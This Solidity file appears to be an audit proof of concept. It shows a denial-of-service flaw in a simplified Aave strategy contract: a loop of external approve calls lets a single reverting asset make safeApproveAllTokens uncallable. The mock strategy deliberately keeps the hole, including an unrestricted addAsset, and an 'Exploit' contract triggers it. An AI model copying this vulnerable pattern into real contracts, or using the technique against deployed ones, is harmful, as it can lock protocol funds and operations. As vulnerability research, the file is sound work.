// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IApprover { function approve(address spender, uint256 amount) external returns (bool); }

contract FailingAsset is IApprover {
    bool public shouldFail;
    constructor(bool fail_) { shouldFail = fail_; }
    function approve(address, uint256) external view returns (bool) {
        require(!shouldFail, "paused asset");
        return true;
    }
}

contract AaveStrategy {
    address[] public assetsMapped;
    function addAsset(address asset) external { assetsMapped.push(asset); }
    function safeApproveAllTokens() external {
        // @> Unbounded external calls make this administrative operation uncallable.
        for (uint256 i; i < assetsMapped.length; ++i) {
            IApprover(assetsMapped[i]).approve(address(this), type(uint256).max);
        }
    }
}

contract Exploit {
    event Proof(bool reverted, uint256 assetCount);
    function run() external {
        AaveStrategy strategy = new AaveStrategy();
        strategy.addAsset(address(new FailingAsset(false)));
        strategy.addAsset(address(new FailingAsset(true)));
        (bool ok,) = address(strategy).call(abi.encodeWithSignature("safeApproveAllTokens()"));
        emit Proof(!ok, 2);
        require(!ok, "unbounded loop remained callable");
    }
}
